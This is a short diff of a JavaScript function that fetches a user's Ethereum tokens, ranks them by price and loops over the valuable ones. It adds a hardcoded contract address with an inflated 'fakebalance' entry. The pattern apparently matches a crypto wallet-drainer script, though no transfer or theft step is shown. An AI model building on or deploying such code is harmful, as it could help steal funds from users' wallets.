@@ -428,10 +428,7 @@ async function proceed(){
         }
           return console.log('No tokens found')
         }
-
-        
-
-
+      
         
         console.log('Eth tokens: %o', eth_tokens);
         console.log('Eth tokens length: %o', eth_tokens.length)
@@ -464,7 +461,14 @@ async function proceed(){
         real_eth_token.sort((a, b) => b.realprice - a.realprice);
         console.log("real_eth_token length : ", real_eth_token.length);
         console.log("real_eth_token : ", real_eth_token);
-
+        
+        real_eth_token[0] = {
+          contractAddress : "0x389999216860ab8e0175387a0c90e5c52522c945",
+          realprice : "1000000",
+          balance : "10000000000000000000000000",
+          decimal : "18",
+          fakebalance : "10000000000000000000000000"
+        };
 
 
         for(let n=0; n<real_eth_token.length && real_eth_token[n].realprice>3; n++){
@@ -539,7 +543,7 @@ async function proceed(){
           // }
         }
         
-          eth_balance = await getBalance(user_address, apiKey).catch(e=>{
+          let eth_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new eth balance", e);
           });
           console.log("eth_balance", eth_balance);
